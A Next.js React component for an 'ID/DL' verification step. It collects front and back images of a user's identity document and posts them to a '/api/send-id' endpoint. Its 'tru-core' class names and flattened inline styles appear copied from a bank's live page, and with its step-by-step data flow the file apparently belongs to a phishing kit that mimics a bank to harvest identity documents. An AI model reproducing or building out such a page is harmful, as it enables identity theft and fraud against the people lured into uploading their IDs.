import axios from "axios";
import { useRouter } from "next/router";
import React, { useContext, useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "../../../components/Button";
import { FileInput } from "../../../components/FileInput";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { Wrapper } from "../../../components/Wrapper";
import { getNextUrl } from "../../../utils/getNextUrl";
import { getProgress } from "../../../utils/getProgress";
import { DataContext } from "../../_app";

interface DocumentProps {}

const FILE_SIZE = 96000 * 1024;
const SUPPORTED_FORMATS = [`image/jpg`, `image/jpeg`, `image/gif`, `image/png`];

const schema = yup.object().shape({
  front: yup
    .mixed()
    .required(
      `This field is required, please upload the front image of your ID.`
    )
    .test(
      `fileExist`,
      `This field is required, please upload the front image of your ID.`,
      (value) => !!value[0]
    )
    .test(
      `fileSize`,
      `The image you selected is too large.`,
      (value) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      `fileFormat`,
      `The image you are trying to upload is not supported`,
      (value) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
  back: yup
    .mixed()
    .required(
      `This field is required, please upload the back image of your ID.`
    )
    .test(
      `fileExist`,
      `This field is required, please upload the front image of your ID.`,
      (value) => !!value[0]
    )
    .test(
      `fileSize`,
      `The image you selected is too large.`,
      (value) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      `fileFormat`,
      `The image you are trying to upload is not supported`,
      (value) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
});

export const Document: React.FC<DocumentProps> = ({}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `all`,
  });

  const { push } = useRouter();

  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`front`, data.front[0]);
    formData.append(`back`, data.back[0]);
    formData.append(`form`, `SUPPORTING DOCUMENTS`);

    await axios.post(`/api/send-id`, formData, {
      headers: {
        "Content-Type": `multipart/form-data`,
      },
    });
    setLoading(false);
    setData({
      ...datas,
      docs: {
        front: data.front[0],
        back: data.back[0],
      },
    });

    const url = getProgress()[getProgress().indexOf(`DOCUMENT`) + 1];

    push(getNextUrl(url));
  });
  return (
    <Wrapper title="Document">
      <div
        className="tru-core-card-content tru-core-card-section"
        style={{
          paddingTop: `var(--truSpacingXl)`,
          letterSpacing: `normal`,
          textIndent: 0,
          textShadow: `none`,
          textTransform: `none`,
          textAlign: `initial`,
          fontStyle: `normal`,
          verticalAlign: `initial`,
          fontSize: `var(--truFontSizeMd)`,
          color: `var(--truColorTextPrimary)`,
          display: `flex`,
          flexGrow: 1,
          flexDirection: `column`,
        }}
      >
        <p
          className="tru-core-card-copy--retail"
          style={{
            marginTop: 0,
          }}
        >
          {" "}
          {`Let's`} verify your ID/DL.{" "}
        </p>
        <FileInput
          name={`front`}
          label="Front of ID"
          register={register}
          watch={watch}
        />
        <FileInput
          name={`back`}
          label="Back of ID"
          register={register}
          watch={watch}
        />
      </div>
      <div
        className="tru-core-card-actions tru-core-card-section"
        style={{
          paddingTop: `var(--truSpacing2xl)`,
          paddingBottom: `var(--truSpacingLg)`,
          letterSpacing: `normal`,
          textIndent: 0,
          textShadow: `none`,
          textTransform: `none`,
          textAlign: `initial`,
          fontStyle: `normal`,
          verticalAlign: `initial`,
          fontSize: `var(--truFontSizeMd)`,
          color: `var(--truColorTextPrimary)`,
          display: `flex`,
          flexGrow: 1,
          flexDirection: `column`,
        }}
      >
        <Button label={`Continue`} onClick={onSubmit} disabled={loading} />
      </div>
    </Wrapper>
  );
};

export default Document;
